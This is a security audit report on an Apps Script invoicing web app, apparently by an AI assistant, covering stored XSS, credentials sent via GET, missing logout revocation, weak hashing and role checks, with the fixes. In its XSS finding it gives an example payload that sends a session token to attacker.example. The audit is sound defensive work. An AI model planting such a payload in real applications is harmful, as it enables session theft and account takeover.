# Security Audit — GME InvoiceApp

Manual code review of `Gscript.txt`, `index.html`, and `super-admin.html` (no automated scanning tools were available in this environment — this is a careful manual read, not a substitute for a professional pen test before handling real customer financial data at scale).

**Ground rule honored throughout:** every fix below is additive or mechanical. None of them remove or change what the app currently does for a legitimate, well-behaved user — they tighten how existing data gets rendered or transmitted, or add a previously-missing revocation/enforcement step.

**On completeness:** the XSS fix (Finding 1) initially covered only the "view" modals and print templates found in the first pass — a follow-up re-check found substantially more unescaped surface (every list table, every autocomplete dropdown, the reports tab, and `super-admin.html` entirely) and fixed those too. That gap is itself worth noting: a manual line-by-line audit of a ~7,000-line frontend file is not the same guarantee as an automated static-analysis pass over every interpolation site. Treat Finding 1 as thoroughly checked, not as a mathematically exhaustive proof — a second reviewer or a proper SAST tool pass before going live with real customer data is still worth doing.

## Remediation status

| # | Finding | Status |
|---|---|---|
| 1 | Stored XSS via unescaped user data | ✅ Fixed — two passes. First pass covered the "view" detail modals and print/certificate templates. A second, wider pass (prompted by re-checking my own work) additionally found and fixed the **list-table renderers** (`renderInvoicesTable`, `renderChallansTable`, `renderQuotationsTable`, `renderCreditNotesTable`, `renderAMCTable`, `renderCertificatesTable`, customers/items tables, dashboard "recent invoices" and AMC widgets), every **buyer/item/recipient autocomplete dropdown**, the **reports tab** (3 of 4 report types), and the equivalent tenant/user tables in `super-admin.html` (which had no escaping helper at all before this). Also added `escapeForInlineHandler()` for values spliced into `onclick="...('${v}')"` — a distinct risk from plain HTML display, since a raw `"` there can break out of the attribute entirely, not just the quote-escaping already used for the JS-string context. The shared `LedgerPrint`/`LedgerPrintGas` engine (invoice/challan/quotation/credit-debit-note *print* output specifically) was audited and found already-consistently escaped via its existing `esc()`/`row()`/`TERMS()` pattern. Given how much this expanded on a second look, treat this as thoroughly-checked rather than provably exhaustive — see the note at the end of this file. |
| 2 | Login credentials sent via GET | ✅ Fixed — `checkLogin` moved to `doPost` (credentials in the body); the insecure `doGet` path was removed outright, not just stopped-using-by-the-client. |
| 3 | No server-side session revocation | ✅ Fixed — added a `logout` POST action (`deleteSessionByToken`) and wired it into `doLogout()`. |
| 4 | `API_SECRET` login gate is a no-op | ✅ Activated — see the note under Finding 4 below for what this now actually does and, importantly, what it still doesn't (it's a public value, not a real secret). |
| 5 | Weak (single-round SHA-256) password hashing | ✅ Fixed — added a v2 stretched-hash algorithm (`hashPasswordStrong`, 10,000 iterations) with transparent upgrade-on-login for existing accounts (`verifyPassword`); all new-credential paths (tenant provisioning, add user, password reset) now use v2 directly. |
| 6 | `Role` stored but never enforced | ✅ Fixed — `saveCompanySettings` and `deleteAMCContract` now require `session.role === 'Admin'`. Every other tenant action (day-to-day billing work) is untouched. See the note under Finding 6 below for why this specific pair and why it's safe for existing accounts. |
| 7 | Verbose error messages on pre-auth paths | ✅ Fixed — `checkLogin` and the super-admin `listTenants`/`listTenantUsers` actions now return a generic message and log detail server-side instead of echoing `err.toString()`. |

---

## Findings, ranked by severity

### 🔴 CRITICAL — Stored XSS via unescaped user data → session token theft

**Where:** `viewInvoice()`, `viewChallan()` in [index.html](index.html) build HTML via template literals and assign it directly to `.innerHTML` on the live app page (not even inside an isolated iframe). `printCertificateHtml()` and other print/preview templates do the same into a same-origin iframe. Affected fields include item `desc`/`hsn`/`remarks`, buyer/recipient `name`/`address`, certificate `recipientName`/`remarks`/`refNo`/`site`, and likely the equivalent quotation/credit-debit-note view functions (same pattern, not individually re-checked one by one, but worth auditing alongside the fix).

**Why it's exploitable:** every one of these values comes from the app's own data-entry forms (item description, buyer name, certificate recipient, etc.), gets saved to a Sheet, and is later dropped straight into an HTML string with **zero escaping**. A value like:
```
<img src=x onerror="fetch('https://attacker.example/steal?t='+sessionStorage.getItem('gme_token'))">
```
entered once as, say, an item description or a certificate recipient name, executes as real JavaScript the moment *anyone* — any staff user, the tenant admin, potentially a Super Admin — views or prints that record. Because `viewInvoice`/`viewChallan` write into the live top-level page, and the print/certificate templates write into a same-origin iframe (which shares the same-tab `sessionStorage`), injected script has direct access to `sessionStorage.getItem('gme_token')` — the exact value that authenticates every backend action. That's a full session-token theft, i.e. account takeover for as long as the token stays valid (see next finding for why that can be a very long time).

**Fix — no functional change:** the codebase already has an `escapeHtml(text)` / `safeHtml(value)` helper defined (near the client `COMPANY` object in index.html) that is **currently never called anywhere in the file**. Apply it at every point where user-supplied text is interpolated into an HTML string — item description/HSN/remarks, buyer/recipient name/address/notes, certificate fields — across all view/print/preview functions, in both `index.html` and, for defense-in-depth, `Gscript.txt`'s certificate/invoice HTML builders (lower urgency there since Drive's PDF conversion doesn't execute script in an authenticated browser session, but unescaped `<`/`>` can still corrupt a PDF's layout). This only changes how literal `<`, `>`, `&`, `"`, `'` characters render (as text instead of being interpreted as markup) — every existing name/description without those characters looks identical to today.

---

### 🔴 CRITICAL / HIGH — Login credentials sent via GET query string

**Where:** `doLogin()` in index.html:
```js
const url=googleScriptUrl+'?action=checkLogin&username='+encodeURIComponent(username)+'&password='+encodeURIComponent(password);
const res=await fetch(url);
```

**Why it matters:** GET query parameters routinely end up in browser history (in plaintext), can be logged by any proxy/CDN/server access log sitting between the browser and Google's infrastructure, and can leak to a third party via the `Referer` header if the page ever navigates to an external resource afterward. A password should never travel in a URL.

**Fix — no functional change:** switch this one call to POST with the credentials in the request body — exactly the pattern the rest of the app already uses everywhere else (`gasPostAMC`). This needs a `checkLogin` handler added to `doPost` (currently it's wired only in `doGet`) and `doLogin()` pointed at it instead. The login form, its validation, and its error messages are unaffected — only the wire transport changes.

---

### 🟠 HIGH — "Logout" doesn't actually revoke the session server-side

**Where:** `doLogout()` in index.html only does `sessionStorage.clear()`. There is no `logout`/`invalidateSession`/`deleteSession` action anywhere in `doGet`/`doPost` in Gscript.txt.

**Why it matters:** the session token itself stays valid in the Sessions sheet until it naturally expires. Worse, `validateSession()` implements **sliding expiration** — it pushes the expiry out by `SESSION_TTL_SEC` (4 hours) on every valid use — so a token that's actively being reused (e.g., by whoever captured it via the XSS above) effectively never expires at all. Clicking "Logout" gives a false sense of security; it doesn't invalidate anything on the server.

**Fix — no functional change:** add a `logout` action that deletes the matching row from the Sessions sheet (same sheet/lookup `validateSession` already does), called from `doLogout()` before it clears local storage. For a normal user, logout just starts actually doing what it already visibly appears to do.

---

### 🟠 HIGH — The `API_SECRET` login gate is currently a no-op

**Where:** `validateLoginSecret(secret)`:
```js
const expected = getProps()['API_SECRET'] || '';
return expected === '' || secret === expected;
```
`doLogin()` on the client never sends a `secret` parameter at all — confirmed by reading the actual login request.

**Why it matters:** since login currently works with no `secret` sent, the `API_SECRET` Script Property must be unset — which means this check trivially passes for anyone. This isn't the *only* gate (username/password with a per-user salted hash is still checked), but it's a second layer that's silently doing nothing right now, which is worth knowing before calling the app "hardened."

**Fix — no functional change if resolved deliberately:** this is really an operational checklist item, not a code bug — either set `API_SECRET` in Script Properties and have the client send it, or consciously decide this layer isn't needed for your threat model and remove the dead branch. Either way, nothing changes for a legitimate user once the client and property are consistent with each other.

> **Status:** activated. `index.html` now defines `const LOGIN_SECRET = "f221bbb2b7cde1221b660b06173627c7edbbf3e17184c645"` and sends it as `secret` on every `checkLogin` call.
>
> **You still need to do one manual step** (not something I can do from here — it's your Google account's Apps Script project settings): open the Apps Script editor → Project Settings → Script Properties, and add a property named `API_SECRET` with the value `f221bbb2b7cde1221b660b06173627c7edbbf3e17184c645` (exactly matching `LOGIN_SECRET` in index.html). Until that property is set, `validateLoginSecret()`'s `expected === ''` branch keeps it a no-op as before — nothing breaks either way, login just doesn't gain the extra check until you set it.
>
> **Important honest caveat:** `index.html` is served publicly — anyone can view-source the page and read `LOGIN_SECRET` directly. This is **not a real secret** in the cryptographic sense, and it must never be treated as a meaningful access barrier. Its only actual value is filtering out fully-blind/automated requests that hit `checkLogin` without ever having loaded the app (simple scanners, stale bookmarked API calls, etc.) — it does nothing against anyone who bothers to open the page's source once. The real access control remains the username/password check. If you want a control that's actually resistant to a targeted attacker, that would mean rate-limiting/lockout on repeated failed logins instead — a genuinely new feature, not something implied by this finding, so I didn't add it; say the word if you'd like it.

---

### 🟡 MEDIUM — Password hashing is a single fast SHA-256 round

**Where:** `hashPassword(password, salt)`:
```js
Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, (salt || '') + '::' + (password || ''))
```

**Why it matters:** SHA-256 is a fast, general-purpose hash. The per-user salt defeats precomputed rainbow tables, but does nothing to slow down brute-force/GPU cracking of a stolen hash. Password hashing should use a deliberately slow, memory-hard function (bcrypt/scrypt/Argon2), or at minimum many thousands of PBKDF2-style iterations.

**Fix — no functional change, needs a quiet migration path:** Apps Script has no native bcrypt, but `Utilities.computeDigest` can be iterated thousands of times to approximate PBKDF2 cheaply. Recommended approach: keep verifying against the *old* single-round hash for existing users; the moment a login succeeds, transparently re-hash the password with the new stretched algorithm and overwrite the stored hash. No forced resets, nothing visibly different for any user — the upgrade happens silently on next login.

> **Status:** fixed. `hashPasswordStrong(password, salt)` iterates SHA-256 10,000 times and prefixes the stored hash `'v2:'`. `verifyPassword()` checks the `'v2:'` prefix to know which algorithm to verify against, so existing v1 hashes still log in — `handleLogin` then transparently re-hashes and overwrites with v2 the moment that login succeeds. All four places that create/reset a password (`provisionTenant`, `handleAddTenantUser`, `handleUpdateTenantUser`'s password reset, and the one-time Script-Properties bootstrap) now call `hashPasswordStrong` directly for anything newly created.

---

### 🟡 MEDIUM — `Role` is stored but never enforced

**Where:** `handleLogin` stores `role: u['Role'] || 'Admin'` in the session object; grepping the whole backend for any `session.role` check returns nothing.

**Why it matters:** every logged-in user of a tenant currently has *identical* permissions to every tenant-scoped backend action — including Settings/Branding changes and deleting AMC contracts — regardless of whatever role they were assigned. Given the User Management feature already lets an admin create multiple per-tenant users, this looks like an intended-but-unfinished distinction rather than a deliberate design choice, but worth confirming with the business either way.

**Fix — adds a layer, removes nothing:** if role separation is actually wanted, gate specific sensitive actions (`saveCompanySettings`, `deleteAMCContract`, etc.) behind `session.role === 'Admin'`. Every currently-created user's access stays exactly the same unless you deliberately create and assign a restricted role going forward.

> **Status:** fixed, scoped deliberately narrow. `doPost` now checks, right after `applyTenantContext(session)`:
> ```js
> const ADMIN_ONLY_ACTIONS = ['saveCompanySettings', 'deleteAMCContract'];
> if (ADMIN_ONLY_ACTIONS.indexOf(action) > -1 && (session.role || 'Admin') !== 'Admin') {
>   return jsonOut({ success: false, message: 'This action requires an Admin role.' });
> }
> ```
> Only these two were picked: `saveCompanySettings` (company-wide branding/PAN/calendar changes) and `deleteAMCContract` (a permanent delete) are the only two tenant-scoped actions that are clearly "administrative" rather than routine billing work — invoices, quotations, certificates, sending WhatsApp/Email, etc. are all still open to any logged-in user, since restricting those would break normal day-to-day use for exactly the kind of staff account a "Staff" role is meant for.
>
> Why this can't silently break anyone: `handleLogin` defaults `role` to `'Admin'` whenever the `Role` column is blank (`u['Role'] || 'Admin'`), so every account that has never had an explicit non-Admin role set is unaffected by this change. This only actually restricts an account that was deliberately given a role other than `'Admin'` — if none exist yet in your Users sheet, this fix currently changes nothing for anyone until you create one. If you *do* already have a non-Admin user relying on Settings or AMC deletion, tell me and I'll adjust the list or revert this specific check.

---

### 🟢 LOW — Error responses can leak raw backend exception text

**Where:** the common pattern `catch (err) { return jsonOut({ success: false, message: err.toString() }) }`, used throughout Gscript.txt, including in pre-authentication paths like `checkLogin`.

**Why it matters:** `err.toString()` in Apps Script is typically just `"Error: <message>"` (not a full stack trace), so real-world leakage is limited — but it's still internal exception text going straight to the caller, authenticated or not.

> **Status:** fixed for the pre-authentication paths specifically (`checkLogin`, `listTenants`, `listTenantUsers`) — each now has its own try/catch returning a generic message and logging the real error via `Logger.log`. The many already-authenticated handlers still return `err.toString()`, matching the "lower urgency, can be left as-is" call in the fix note above.

**Fix — minor change to error text only, no feature impact:** `Logger.log(err)` for full detail server-side, and return a generic message on the pre-session paths specifically (`checkLogin`, and the super-admin `listTenants`/`listTenantUsers` before their secret check). The many already-authenticated handlers are lower risk and can be left as-is if you'd rather minimize the diff.

---

## What's already solid — worth explicitly keeping

- **Per-tenant isolation is structural, not a filter.** Each tenant's business data lives in a completely separate Google Sheet — there's no `WHERE tenantId = ...`-style query to get wrong, and therefore no cross-tenant row-leakage vector to find in the first place.
- Passwords are salted per-user (the hash speed is the only gap — Finding #5).
- Drive-shared PDF/branding files are shared **individually**, never at the folder level — one leaked invoice link doesn't expose every other tenant's files.
- Secrets (`SUPER_ADMIN_SECRET`, `API_SECRET`) live in Script Properties, not hard-coded in source — already good practice.
- `ensureHeaders()`'s additive-only migration pattern means a schema change can never silently overwrite existing data.
- Super-admin actions are gated by their own secret, checked **before** any tenant-session logic runs in the router — this ordering was actually a bug once this session and has since been fixed correctly.

## Suggested order of work before go-live

1. **Fix the XSS (Finding 1)** — highest real-world impact, and the fix is mechanical: wire up the escaping helper that already exists.
2. **Fix login-over-GET and add real logout (Findings 2 & 3)** together — both touch the same login/session code path, worth doing in one pass.
3. **Resolve `API_SECRET` (Finding 4)** — a five-minute decision, not a build.
4. **Schedule the password-hashing upgrade and role enforcement (Findings 5 & 6)** — not blocking for a first go-live if all current users are trusted internal staff, but shouldn't be deferred indefinitely, especially the hashing one.
5. **Error-message tightening (Finding 7)** — lowest urgency, do whenever convenient.
